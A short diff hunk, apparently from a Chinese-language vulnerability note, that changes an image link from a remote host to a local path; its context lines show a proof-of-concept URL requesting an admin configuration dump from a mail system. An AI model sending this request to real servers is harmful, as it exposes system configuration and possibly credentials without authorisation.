@@ -24,6 +24,6 @@ POC为
 http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101913188.png)
+![](./images/202202101913188.png)
 
 
